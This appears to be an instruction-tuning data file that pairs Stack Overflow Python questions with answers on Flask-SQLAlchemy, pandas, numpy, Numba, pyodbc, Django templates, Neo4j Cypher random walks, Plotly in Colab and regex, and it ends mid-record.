{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Flask SQLAlchemy db.create_all(app = app) can't set attribute<p>Flask SQLAlchemy db.create_all(app = app) can't set attribute. The database.db file is not being created.Every time I try to create it shows that it cant set the attributes.I have used the same technique in another app but at that time it worked.Please just help me to get rid of this error. I am new to flask .<\/p>\n<p>Here is my <strong>init<\/strong>.py<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from flask import Flask\nfrom flask_sqlalchemy import SQLAlchemy\nfrom os import path\nfrom flask_login import LoginManager\n\n# creating the object for database\ndb = SQLAlchemy()\nDB_NAME = &quot;database.db&quot;\n\n\n# for creating the app\ndef create_app():\n    # initializing the app\n    app = Flask(__name__)\n    app.config['SECRET_KEY'] = &quot;Any secret key&quot;\n    # initializing the data base\n    app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:\/\/\/{DB_NAME}'\n    # for debugging sql\n    # app.config['SQLALCHEMY_ECHO'] = True\n    db.init_app(app)\n\n    # now for registering the blueprints\n    from .views import views\n    from .auth import auth\n\n    app.register_blueprint(views , url_prefix='\/')\n    app.register_blueprint(auth , url_prefix='\/')\n\n    # for creating database\n    # from .models import User , Room , Participant , Message\n    from .models import User,Note\n    create_database(app)\n    \n    return app\n\n\ndef create_database(app):\n    # if the database does not exist then we will create it\n    if not path.exists('website\/'+DB_NAME):\n        db.create_all(app = app)\n        print('Database created')\n<\/code><\/pre>\n<h2>The create_database() def is not working<\/h2>\n<p>My models.py<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from . import db\nfrom flask_login import UserMixin\nfrom sqlalchemy.sql import func\n\n\n\n\n\n# The User will inherit database model and UserMixin . The UserMixin is for authentication\n# purpose\nclass User(db.Model , UserMixin):\n    id = db.Column(db.Integer , primary_key = True)\n    email = db.Column(db.String(150) , unique = True)\n    password = db.Column(db.String(150))\n    firstname = db.Column(db.String(150))\n    lastname = db.Column(db.String(150))\n    # a sudo column in Note\n    notes = db.relationship('Note')\n\n    # def __repr__(self):\n    #     print(f&quot;&lt;Post {self.firstname}&gt;&quot;)\n\n\nclass Note(db.Model):\n    id = db.Column(db.Integer , primary_key = True)\n    data = db.Column(db.String(10000))\n    date = db.Column(db.DateTime(timezone=True), default = func.now())\n    user_id = db.Column(db.Integer , db.ForeignKey('user.id')) \n<\/code><\/pre>\n<p>The main.py<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from website import create_app\n\napp = create_app()\n\n\nif __name__ == '__main__':\n    # This is a debugging server\n    app.run(debug = True)\n<\/code><\/pre>\n<p>Here is the pic of the app structure:\n<a href=\"https:\/\/i.stack.imgur.com\/eohPe.png\" rel=\"nofollow noreferrer\">app structure<\/a><\/p>\n<p>Here's the log:\nIn the log it says that attribute cant be set.\nI have also tried to build the database manually but it doesn't work<\/p>\n<pre><code>(venv) naheed@naheed-s15-x530un:~\/Desktop\/flask-chat-app-v2$ python main.py \n\/home\/naheed\/Desktop\/flask-chat-app-v2\/venv\/lib\/python3.8\/site-packages\/flask_sqlalchemy\/__init__.py:833: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will be disabled by default in the future.  Set it to True or False to suppress this warning.\n  warnings.warn(FSADeprecationWarning(\nTraceback (most recent call last):\n  File &quot;main.py&quot;, line 3, in &lt;module&gt;\n    app = create_app()\n  File &quot;\/home\/naheed\/Desktop\/flask-chat-app-v2\/website\/__init__.py&quot;, line 32, in create_app\n    create_database(app)\n  File &quot;\/home\/naheed\/Desktop\/flask-chat-app-v2\/website\/__init__.py&quot;, line 40, in create_database\n    db.create_all(app = app)\n  File &quot;\/home\/naheed\/Desktop\/flask-chat-app-v2\/venv\/lib\/python3.8\/site-packages\/flask_sqlalchemy\/__init__.py&quot;, line 1039, in create_all\n    self._execute_for_all_tables(app, bind, 'create_all')\n  File &quot;\/home\/naheed\/Desktop\/flask-chat-app-v2\/venv\/lib\/python3.8\/site-packages\/flask_sqlalchemy\/__init__.py&quot;, line 1031, in _execute_for_all_tables\n    op(bind=self.get_engine(app, bind), **extra)\n  File &quot;\/home\/naheed\/Desktop\/flask-chat-app-v2\/venv\/lib\/python3.8\/site-packages\/flask_sqlalchemy\/__init__.py&quot;, line 962, in get_engine\n    return connector.get_engine()\n  File &quot;\/home\/naheed\/Desktop\/flask-chat-app-v2\/venv\/lib\/python3.8\/site-packages\/flask_sqlalchemy\/__init__.py&quot;, line 555, in get_engine\n    options = self.get_options(sa_url, echo)\n  File &quot;\/home\/naheed\/Desktop\/flask-chat-app-v2\/venv\/lib\/python3.8\/site-packages\/flask_sqlalchemy\/__init__.py&quot;, line 570, in get_options\n    self._sa.apply_driver_hacks(self._app, sa_url, options)\n  File &quot;\/home\/naheed\/Desktop\/flask-chat-app-v2\/venv\/lib\/python3.8\/site-packages\/flask_sqlalchemy\/__init__.py&quot;, line 914, in apply_driver_hacks\n    sa_url.database = os.path.join(app.root_path, sa_url.database)\nAttributeError: can't set attribute\n\n<\/code><\/pre>","output_text":"<p>I have solved the problem by Downgrading the SQLAlchemy . For some reason the latest version is not working<\/p>\n<blockquote>\n<p>pip install 'SQLAlchemy&lt;1.4.0'<\/p>\n<\/blockquote>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can implement http\/3 protocol throuh udp (DTLS) socket in python?<p>I read that http\/3 uses UDP instead of TCP to send requests, so that makes it faster, And I really need the speed of http\/3, So what can I do, to implement it in python?.\nI wrote this code based on my understanding of the protocol:<\/p>\n<p>It's a hypertext protocol, You using UDP instead of TCP, change the http\/1.1 in the packet to http\/3, send it.<\/p>\n<p>And I think I'm wrong.<\/p>\n<p>here's the code I wrote:<\/p>\n<pre><code>import socket\nfrom OpenSSL import SSL # for DTLS\n\nconnection = 'close' # or keep-alive\n\nprotocol = 'HTTP\/3' # or HTTP\/1.1\n\npacket = f'GET \/ {protocol}\\r\\nHost: i.instagram.com\\r\\nConnection: {connection}\\r\\n\\r\\n'\n\ndef callback(conn, cert, errnum, depth, ok): cert.get_subject(); return ok\n\n# Initialize context\nctx = SSL.Context(SSL.TLSv1_2_METHOD)\nctx.set_verify(SSL.VERIFY_PEER, callback) # Demand a certificate\n\n# Set up client\nclient = SSL.Connection(ctx, socket.socket(socket.AF_INET, socket.SOCK_DGRAM))\naddr = ('i.instagram.com', 443) #using DTLS\nclient.connect(addr)\n\n\nbuffer = packet.encode()\nclient.sendall(buffer) # it stuck here\nprint(sock.recv(4096))\n<\/code><\/pre>","output_text":"<p>One can most certainly implement HTTP\/3 in Python.  It has already been done: check out <a href=\"https:\/\/github.com\/aiortc\/aioquic\" rel=\"nofollow noreferrer\">aioquic<\/a>.<\/p>\n<p>Also, please have a look at the latest set of <a href=\"https:\/\/datatracker.ietf.org\/doc\/html\/draft-ietf-quic-transport-30\" rel=\"nofollow noreferrer\">QUIC<\/a> and <a href=\"https:\/\/datatracker.ietf.org\/doc\/html\/draft-ietf-quic-http-30\" rel=\"nofollow noreferrer\">HTTP\/3<\/a> Internet Drafts.  Your naive implementation is based on wrong assumptions.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n how to repeat a numpy vector to create an array with the rest of array being zeros<p>I would like the create the following numpy array, based on the following vector\n<code>e = numpy.array([1,0,0,0,0,0])<\/code><\/p>\n<pre><code>a = [ [e, 0, ---, 0],\n      [0, e, ---, 0],\n      -\n      -\n      [0, 0, ---, e]]\n<\/code><\/pre>\n<p>(Note: The <code>0<\/code> in this array is thus a zero vector and not scalar)<\/p>\n<p>and thus;<\/p>\n<pre><code>a = [ [1,0,0,0,0,0, 0,0,0,0,0,0, ---, 0,0,0,0,0,0],\n      [0,0,0,0,0,0, 1,0,0,0,0,0, ---, 0,0,0,0,0,0],\n      -\n      -\n      [0,0,0,0,0,0, 0,0,0,0,0,0  ---, 1,0,0,0,0,0]]\n<\/code><\/pre>\n<p>The solutions does not have to make use of <code>e<\/code>. The structure of the first array (based on <code>e<\/code>) is due the underlying linear algebra of the problem I'm tackling.<\/p>\n<p>I have looked at tile and repeat from numpy. However, I was not able to create <code>a<\/code> with these functions. Ideally, I would like to use a numpy function as speed is quite important for my implementation.<\/p>\n<hr \/>\n<p>EDIT: <code>e<\/code> is an numpy array and not a python list<\/p>\n<p>EDIT: added some extra information<\/p>","output_text":"<p>Initially the suggestion from 'Michael Szczesny', was the one I ended up using. However, I found out as well that the <a href=\"https:\/\/en.wikipedia.org\/wiki\/Kronecker_product\" rel=\"nofollow noreferrer\">Kronecker product<\/a> is the mathematical operation which I was looking for.<\/p>\n<p>From this <a href=\"https:\/\/stackoverflow.com\/a\/17039049\/12767361\">StackOverflow answer<\/a> it seems(\/seemed) that the SciPy implementation works better than the NumPy one. This answer is quite old (2013). However, I do not have enough reputation to ask a followup question.<\/p>\n<p>Maybe someone else would benefit from this information<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to convert a python list to pandas Dataframe in python<p>I have this <code>python<\/code> <code>list<\/code> and I need to convert it into <code>pandas<\/code> <code>dataframe<\/code>.<\/p>\n<p>This is how my list looks like:<\/p>\n<pre><code>thisdict = {}\n\nthisdict[&quot;Column1&quot;] = 1\nthisdict[&quot;Column2&quot;] = 2\n\nthisdict # this print\n\n{'Column1': 1, 'Column2': 2}\n<\/code><\/pre>\n<p>And I need to convert this to <code>pandas<\/code> dataframe.<\/p>\n<p>I tried:<\/p>\n<pre><code>df = pd.DataFrame(thisdict)\n<\/code><\/pre>\n<p>and I got the error as below:<\/p>\n<blockquote>\n<p>ValueError: If using all scalar values, you must pass an index<\/p>\n<\/blockquote>\n<p>Can someone please help me?<\/p>","output_text":"<p>You are supposed to assign the column as lists in your code.<\/p>\n<p>Try replacing lines 2 and 3 with :<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>thisdict[&quot;Column1&quot;] = [1]\nthisdict[&quot;Column2&quot;] = [2]\n<\/code><\/pre>\n<p>Complete code :<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>thisdict = {}\nthisdict[&quot;Column1&quot;] = [1]\nthisdict[&quot;Column2&quot;] = [2]\ndf = pd.DataFrame(thisdict)\n<\/code><\/pre>\n<p>Output :<\/p>\n<pre><code>    Column1 Column2\n0         1       2\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python code to calculate base Lagrange Polynomial is taking too long for large numbers of data<p>So, I need help minimizing the time it takes to run the code with large numbers of data only by using NumPy. I think the for loops made my code inefficient.. But I do not know how to make the for loop into a list comprehension, which might help it run faster..<\/p>\n<pre><code>def lagrange(p,node,n,x):\n    m=[]\n\n        #base lagrange polynomial\n    for i in range(n):\n        for j in range(p+1):\n            L=1\n            for k in range(p+1):\n                if k!=j:\n                    L= L*(x[i] - node[k])\/(node[j] - node[k])\n                \n            m.append(L)\n    lagrange= np.array(m).reshape(n,p+1)\n    return lagrange\n\n\ndef interpolant(a,b,p,n,x,f):\n        m=[]\n        node=np.linspace(a,b,p+1)\n        for j in range(n):\n             polynomial=0 \n            for i in range(p+1):\n                polynomial += f(node[i]) * lagrange(p,node,n,x) \n        m.append(polynomial) \n\n        interpolant = np.array(inter) \n\n                return interpolant\n    \n<\/code><\/pre>","output_text":"<p>It appears the value of <code>lagrange_poly(...)<\/code> is <strong>recomputed <code>n*(p+1)<\/code> times for no reason<\/strong> which is very very expensive! You can compute it once before the loop, store it in a variable and reuse the variable later.<\/p>\n<p>Here is the fixed code:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def uniform_poly_interpolation(a,b,p,n,x,f,produce_fig):\n        inter=[]\n        xhat=np.linspace(a,b,p+1)\n        #use for loop to iterate interpolant.\n        mat = lagrange_poly(p,xhat,n,x,1e-10)[0]\n        for j in range(n):\n                po=0 \n                for i in range(p+1):\n                    po += f(xhat[i]) * mat[i,j]\n        inter.append(po) \n\n        interpolant = np.array(inter) \n        return interpolant\n<\/code><\/pre>\n<p>This should be much much faster.<\/p>\n<hr \/>\n<p>Moreover, the execution is slow because <strong>accessing scalar values of Numpy arrays from CPython is very slow<\/strong>. Numpy is designed to work with array and not to extract scalar values in loops. Additionally, the loop CPython interpreter are relatively slow. You can solve this problem efficiently with <strong>Numba<\/strong> that compile your code to a very fast native code using a JIT-compiler.<\/p>\n<p>Here is the Numba code:<\/p>\n<pre><code>import numba as nb\n\n@nb.njit\ndef lagrange_poly(p, xhat, n, x, tol):\n    error_flag = 0\n    er = 1\n    lagrange_matrix = np.empty((n, p+1), dtype=np.float64)\n\n    for l in range(p):\n        if abs(xhat[l] - xhat[l+1]) &lt; tol:\n            error_flag = er\n\n    # Base lagrange polynomial\n    for i in range(n):\n        for j in range(p+1):\n            L = 1.0\n            for k in range(p+1):\n                if k!=j:\n                    L = L * (x[i] - xhat[k]) \/ (xhat[j] - xhat[k])\n            lagrange_matrix[i, j] = L\n\n    return lagrange_matrix, error_flag\n<\/code><\/pre>\n<p>Overall, this should be <em>several order of magnitude faster<\/em>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n pyodbc - cursor does not accept integer parameters when using python 3<p>Good day,<\/p>\n\n<p>I am having issues with my select queries when I use non-string parameters for my SQL queries with pyodbc.<\/p>\n\n<p>My current environment:<\/p>\n\n<ul>\n<li><p>Windows Server 2016 (64-bit)<\/p><\/li>\n<li><p>Python 3 (64-bit) via Anaconda 2018.12 \/ Python 2 (32-bit) via Anaconda 5.1.0<\/p><\/li>\n<li><p>oracle 12 odbc driver (64 bit) \/ oracle 11 odbc driver (32-bit)<\/p><\/li>\n<li><p>Database: Oracle 11g<\/p><\/li>\n<li><p>pyodbc version 4.0.25<\/p><\/li>\n<\/ul>\n\n<p>Here are some code snippets below.<\/p>\n\n<p>Code for creating a database connection object and declaring the cursor object as a class variable:<\/p>\n\n<pre><code>class DB_Oracle(object):\n    \"\"\"Database connections for Oracle Databases.\n    \"\"\"\n\n    def __init__(self, Target=\"test\"):\n        \"\"\"Connect to the target database and create a cursor for doing queries.\n        \"\"\"\n        if Target == \"test\":\n            if platform.architecture()[0] == \"64bit\":\n                self.DatabaseDriver = \"{Oracle in OraClient12Home1}\"\n            else:\n                self.DatabaseDriver = \"{Oracle in OraClient11g_home1}\"\n\n            self.DatabaseUser = #omitted\n            self.DatabasePassword = #omitted\n\n            self.HostName = #omitted\n            self.Port = \"1521\"\n            self.SID = #omitted\n            self.DBQ = self.HostName + \":\" + self.Port + \"\/\" + self.SID\n\n            print(\"            - Assyst: Connecting to \"+self.HostName+\" with driver \"+self.DatabaseDriver)\n            try:\n                self.dbconnection = pyodbc.connect(\n                        \"DRIVER=\" + self.DatabaseDriver +\n                        \";DBQ=\" + self.DBQ + \n                        \";UID=\" + self.DatabaseUser + \n                        \";PWD=\" + self.DatabasePassword)\n                self.cursor = self.dbconnection.cursor()\n                print(\"            - Connection completed: \" + str(Target))\n            except:\n                print(\"** ERROR: Can not create connection to: \" + str(Target))\n\n        else:\n            print(\"** ERROR: The requested target Database is unknown: \" + str(Target))\n\n        return(None)\n<\/code><\/pre>\n\n<p>Example code for querying said database:<\/p>\n\n<pre><code>if __name__=='__main__':\n    db_conn = DB_Oracle(Target=\"test\")\n    sql_query = \"SELECT * from TEST_TABLE WHERE TEST_ID = ?\"\n    param = 1\n    db_conn.cursor.execute(sql_query, param)\n    print(db_conn.cursor.fetchall())\n    db_conn.cursor.close()\n<\/code><\/pre>\n\n<p>The above code will work if I am using Python 2, but will fail if I use python 3. It will spit out the following error:<\/p>\n\n<pre><code>Error: ('HY000', 'The driver did not supply an error!')\n<\/code><\/pre>\n\n<p>If I declare my <strong>param<\/strong> variable as a string:<\/p>\n\n<pre><code>    param = '1'\n<\/code><\/pre>\n\n<p>The code will execute as normal.<\/p>\n\n<p>Table data for reference:<\/p>\n\n<pre><code>TEST_TABLE\n\nTEST_ID | TEST_NAME\n-------------------\n1       | 'test1' \n2       | 'test2' \n3       | 'test3' \n4       | 'test4' \n<\/code><\/pre>\n\n<p>What I have narrowed down through my troubleshooting is that this problem only affects python 3 code querying Oracle databases. The ODBC drivers don't seem to be the issue nor python's bit-ness.<\/p>\n\n<p>I could cast all my parameters as a string for my existing queries, but I would like to refrain from doing that if possible. PDB hasn't helped me much either in debugging my code. <\/p>\n\n<p>Where could I go from here?<\/p>\n\n<p>Thank you<\/p>","output_text":"<p>So...<\/p>\n\n<p>Turns out that an old version of pyodbc was the issue. Doing an update from 4.0.25 to 4.0.30 on the pyodbc package within Anaconda fixed the problem.<\/p>\n\n<p>I rather not modify the base installation of the anaconda package so it looks like I'll use a virtual environment of some sort.<\/p>\n\n<p>Thank you all that viewed my question<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Django template language \"If\" statement with many \"and\"<p>Basically i want to add a class to a div based on whether some variables have content or not.<\/p>\n<p><strong>This is the If statement:<\/strong><\/p>\n<pre><code>&lt;div class=&quot;search__container\n    {% if images == true and blogs != True and parks != True %} \n        only-images \n    {% elif blogs == true and images != True and parks != True %} \n        only-blog\n    {% elif parks == true and blogs != True and images != True %} \n        only-parks\n    {% elif parks == true and blogs == true and images != True %} \n        only-parks-blogs\n    {% elif parks == true and images == true and blogs != True %} \n        only-parks-images\n    {% elif images == true and blogs == true and parks != True %} \n        only-images-blogs \n    {% endif %}&quot;\n&gt;\n<\/code><\/pre>\n<p>This way it's not adding any class under any circumstances.<\/p>\n<p>If instead i remove the <code>==<\/code> and replace the <code>!=<\/code> with <code>is not<\/code> it'll always take the first if as True and add the class <code>only-images<\/code><\/p>","output_text":"<p>Using == and != with boolean True\/False is no longer advised in python. Try this<\/p>\n<pre><code>&lt;div class=&quot;search__container\n    {% if images and not blogs and not parks %} \n        only-images \n    {% elif blogs and not images and not parks %} \n        only-blog\n    {% elif parks and not blogs and not images %} \n        only-parks\n    {% elif parks and blogs and not images %} \n        only-parks-blogs\n    {% elif parks and images and not blogs %} \n        only-parks-images\n    {% elif images and blogs and not parks %} \n        only-images-blogs \n    {% endif %}&quot;\n&gt;\n<\/code><\/pre>\n<p>Otherwise, consider putting these conditions into single line boolean variables in the context passed to the template (views.py) and just validate &quot;if images_no_logs_no_parks&quot; etc<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can I randomly walk between nodes by weights in Neo4j with Python?<p>I've created nodes in Neo4j with the following code,<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from py2neo import Graph, Node, Relationship\n\ng = Graph(password='neo4j')\ntx = g.begin()\n\nnode1 = Node('Node', name='Node-1')\nnode2 = Node('Node', name='Node-2')\nnode3 = Node('Node', name='Node-3')\nnode4 = Node('Node', name='Node-4')\nnode5 = Node('Node', name='Node-5')\nnode6 = Node('Node', name='Node-6')\nnode7 = Node('Node', name='Node-7')\n\ntx.create(node1)\ntx.create(node2)\ntx.create(node3)\ntx.create(node4)\ntx.create(node5)\ntx.create(node6)\ntx.create(node7)\n\nrel12 = Relationship(node1, '0.2', node2, weight=0.2)\nrel13 = Relationship(node1, '0.2', node3, weight=0.2)\nrel14 = Relationship(node1, '0.6', node4, weight=0.6)\nrel45 = Relationship(node4, '0.5', node5, weight=0.5)\nrel46 = Relationship(node4, '0.3', node6, weight=0.3)\nrel47 = Relationship(node4, '0.2', node7, weight=0.2)\n\ntx.create(rel12)\ntx.create(rel13)\ntx.create(rel14)\ntx.create(rel45)\ntx.create(rel46)\ntx.create(rel47)\n\ntx.commit()\n<\/code><\/pre>\n<p>Here is the graph in <code>Neo4j<\/code> interface,\n<img src=\"https:\/\/i.stack.imgur.com\/LE7Ht.png\" alt=\"neo4j-graph\" \/><\/p>\n<p>I want to select a node by name and then, I want to walk to another node randomly. But random selection should be like that,<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import random\n\nrandom.choices(['Node-2', 'Node-3', 'Node-4'], weights=(0.2, 0.2, 0.6))\n<\/code><\/pre>\n<p>I can select the node with following code, but I don't know how to walk to the other node randomly.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from py2neo import Graph\nfrom py2neo.matching import NodeMatcher\n\ng = Graph(password='neo4j')\nnodes = NodeMatcher(g)\nnode1 = nodes.match('Node', name='Node-1').first()\n<\/code><\/pre>\n<p>If node-1 is the starting point, ways that can be walked,<\/p>\n<pre><code>Node-1 -&gt; Node-2\nNode-1 -&gt; Node-3\nNode-1 -&gt; Node-4 -&gt; Node-5\nNode-1 -&gt; Node-4 -&gt; Node-6\nNode-1 -&gt; Node-4 -&gt; Node-7\n<\/code><\/pre>\n<p>Any idea? Thanks in advance.<\/p>","output_text":"<p>Py2neo supports making Cypher queries, and <a href=\"https:\/\/nicolewhite.github.io\/neo4j-jupyter\/hello-world.html\" rel=\"nofollow noreferrer\">here is a nice hello-world tutorial<\/a> on how to do that.<\/p>\n<p>So, I will provide a commented Cypher query that will hopefully work for you.<\/p>\n<p>But first, a few notes:<\/p>\n<ul>\n<li>You <em><strong>should not<\/strong><\/em> give relationships that serve the same purpose a virtually infinite number of types (like &quot;0.2&quot;, &quot;0.5&quot;, etc.), as that is VERY unhelpful when you want to search for specific relationships by type (which is one of the most common things you will want to do) and will cause an enormous number of relationship types. So I assume in my answer that the relationships of interest all actually have the <code>TO<\/code> type.<\/li>\n<li>My query uses a temporary <code>Temp<\/code> node to store the temporary state of the query as it iterates through the relationships in a random path. The <code>Temp<\/code> node will be deleted at the end of the query.<\/li>\n<\/ul>\n<p>The query is as follows:<\/p>\n<pre><code>\/\/ Get the (assumed-unique) starting Node `n` \nMATCH (n:Node)\nWHERE n.name = 'Node-1'\n\n\/\/ Create (if necessary) the unique `Temp` node, and initialize\n\/\/ it with the native ID of the starting node and an empty `pathRels` list\nMERGE (temp:Temp)\nSET temp = {id: ID(n), pathRels: []}\nWITH temp\n\n\/\/ apoc.periodic.commit() repeatedly executes the query passed to it\n\/\/ until it returns 0 or NULL.\n\/\/ The query passed here iteratively extends the list of relationships\n\/\/ in `temp.pathRels`. In each iteration, if the current `temp.id`\n\/\/ node has any outgoing `TO` relationships, the query:\n\/\/ - appends to `temp.pathRels` a randomly-selected relationship, taking\n\/\/   into account the relationship weights (which MUST sum to 1.0),\n\/\/ - sets `temp.id` to the ID of the end node of that selected relationship,\n\/\/ - and returns 1.\n\/\/ But if the current `temp.id` node has no outgoing `TO` relationships, then\n\/\/ the query returns 0.\nCALL apoc.periodic.commit(\n  &quot;\n    MATCH (a:Node)\n    WHERE ID(a) = $temp.id\n    WITH a, [(a)-[rel:TO]-&gt;() | rel] AS rels\n    LIMIT 1 \/\/ apoc.periodic.commit requires a LIMIT clause. `LIMIT 1` should be harmless here.\n    CALL apoc.do.when(\n      SIZE(rels) &gt; 0,\n      '\n       WITH temp, a, REDUCE(s={x: rand()}, r IN rels | CASE\n         WHEN s.x IS NULL THEN s\n         WHEN s.x &lt; r.weight THEN {x: NULL, pathRel: r}\n         ELSE {x: s.x - r.weight} END\n       ).pathRel AS pathRel\n       SET temp.id = ID(ENDNODE(pathRel)), temp.pathRels = temp.pathRels + pathRel\n       RETURN 1 AS result\n      ',\n      '\n       RETURN 0 AS result\n      ',\n      {temp: $temp, a: a, rels: rels}\n    ) YIELD value\n    RETURN value.result\n  &quot;,\n  {temp: temp}\n) YIELD batchErrors\n\n\/\/ Use the `temp.pathRels` list to generate the `weightedRandomPath`\n\/\/ (or you could just return `pathRels` as-is).\n\/\/ Then delete the `Temp` node, since it is no longer needed.\n\/\/ Finally, return `weightedRandomPath`, and also the `batchErrors` returned by\n\/\/ apoc.periodic.commit() (in case it had any errors). \nWITH temp, apoc.path.create(STARTNODE(temp.pathRels[0]), temp.pathRels) AS weightedRandomPath, batchErrors\nDELETE temp\nRETURN weightedRandomPath, batchErrors\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Plotly choropleth map not showing in Google Colab<p>I have been trying every single solution that has been suggested over the Internet, but none of them seems to work for me. I get either a blank page or just the legend\/colorbar for my choropleth map when I try to plot with Plotly in Colab. Can someone help me out with it?\nHere is a very basic code that I try to plot.<\/p>\n<pre><code>import plotly.express as px\nfig = px.choropleth(gdf,\n                    locations=&quot;id&quot;,\n                    geojson=geojson,\n                    color=&quot;Total - Visible minority&quot;,\n                    scope=&quot;north america&quot;,\n                    projection=&quot;conic conformal&quot;\n                    )\nfig.show()\n<\/code><\/pre>","output_text":"<p>I've encountered a couple of errors, with suggestions you may have seen:<\/p>\n<p><a href=\"https:\/\/stackoverflow.com\/questions\/47230817\/plotly-notebook-mode-with-google-colaboratory\">Plotly notebook mode with google colaboratory<\/a><\/p>\n<p>In particular these three possible fixes:<\/p>\n<pre><code>fig.show(renderer=&quot;colab&quot;)\n<\/code><\/pre>\n<p>Or by setting global default:<\/p>\n<pre><code>import plotly.io as pi\npio.renderers.default = &quot;colab&quot;\n<\/code><\/pre>\n<p>Finally, and unfortunately the possibility of having to set browser defaults in each cell by creating this function:<\/p>\n<pre><code>  def configure_plotly_browser_state():\n      import IPython\n      display(IPython.core.display.HTML('''\n            &lt;script src=&quot;\/static\/components\/requirejs\/require.js&quot;&gt;&lt;\/script&gt;\n            &lt;script&gt;\n              requirejs.config({\n                paths: {\n                  base: '\/static\/base',\n                  plotly: 'https:\/\/cdn.plot.ly\/plotly-latest.min.js?noext',\n                },\n              });\n            &lt;\/script&gt;\n            '''))\n<\/code><\/pre>\n<p>And then running <code>configure_plotly_browser_state()<\/code> in the cell with <code>fig.show()<\/code><\/p>\n<p>Not a beautiful solution I know, but hopefully they work for you.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Regex to get previous word followed by a phrase in python<p>I need to extract the word <strong>local<\/strong> when it comes before <strong>gun store<\/strong>. But, the below function is not returning it because of using split. Is there any way to get around this?<\/p>\n<p>Source looks like this: As reported on 30 December 2019, in Maipu, Metropolitan region, a group of at least 10 rioters attempted to loot a local gun store.<\/p>\n<p>Here is the function:<\/p>\n<pre><code>    regex_filter = r'local|dozen|several|looted'\n    property_key = r&quot;\\b(gun store|establishments|supermarket)\\b&quot;\n    source= source.split()\n    for i, w in enumerate(source):\n        if (re.search(property_key, w)):\n            if re.match(re.compile(regex_filter, flags=re.IGNORECASE), source[i-1]):\n                return source[i-1]```\n<\/code><\/pre>","output_text":"<p>I suggest extracting the word preceding any of the words listed in <code>property_key<\/code> with<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>re.search(r&quot;(\\S+)\\s+(?:gun store|establishments|supermarket)\\b&quot;, text)\n<\/code><\/pre>\n<p>Or, if the word is formed with word chars and there can be any whitespace\/punctuation between the words:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>re.search(r&quot;([^\\W_]+)[\\W_]+(?:gun store|establishments|supermarket)\\b&quot;, text)\n<\/code><\/pre>\n<p>See the <a href=\"https:\/\/regex101.com\/r\/I8OprX\/1\" rel=\"nofollow noreferrer\">regex demo<\/a>.<\/p>\n<p>The <code>(\\S+)\\s+<\/code> matches and captures one or more non-whitespace chars into Group 1 and then matches one or more whitespace chars, while <code>([^\\W_]+)[\\W_]+<\/code> matches and captures one or more letters or digits into Group 1 and then one or more non-word or underscore chars are matched.<\/p>\n<p>See the <a href=\"https:\/\/ideone.com\/lxygzY\" rel=\"nofollow noreferrer\">Python demo<\/a>:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import re\nrx = r&quot;(\\S+)\\s+(?:gun store|establishments|supermarket)\\b&quot;\ntext = &quot;As reported on 30 December 2019, in Maipu, Metropolitan region, a group of at least 10 rioters attempted to loot a local gun store.&quot;\nm = re.search(rx, text)\nif m:\n    print(m.group(1))\n\n# =&gt; local\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n NameError when accessing imported python packages from within imported python script<p><strong>Problem statement:<\/strong><\/p>\n<p>I'm writing a program in Jupyter Notebook that dynamically writes another script (script.py). After writing script.py, the function that wrote the file runs it via an import statement, then calls a function from script.py.<\/p>\n<p>I need to use pandas in script.py, and I import it at the top of script.py. I get <code>NameError: name 'pd' is not defined<\/code> just after executing <code>import pandas as pd<\/code> at the top of script.py. I initially tried leaving out the import statement since it was already executed in the calling program, but I got the same error. I tried putting the import statement within the function in script.py, but I got the same error.<\/p>\n<p><strong>Update2, resolved:<\/strong>\nThe code now works. I'm pretty sure the only thing I did was walk away and come back and enter <code>%debug<\/code>, and restart the kernel and run all cells. It found no traceback to debug. I guess you could say it was magic, but maybe it was restarting the kernel. Magic makes more sense to me, haha.<\/p>\n<p><strong>Update1:<\/strong>\nThe original example code did not actually reproduce the error. If I would have test run it, I would have better isolated the problem in the real code. My bad. I'm still not able to fix the problem, but it seems like there's something about the loop that constructs the write statements that is messing up. Because running similar code once without a loop works.<\/p>\n<p>Here's my real code:<\/p>\n<pre><code>import os\nimport pandas as pd\n\ndef read_files_in_folder(fp_list, path=None, arg_list=None):\n    '''Reads a folder of csv tables into a dictionary of dataframes.\n    Does this dynamically by writing a script to a file, importing the script,\n    and running a function from the script.\n    Parameters:\n        fp_list is [str]: list of 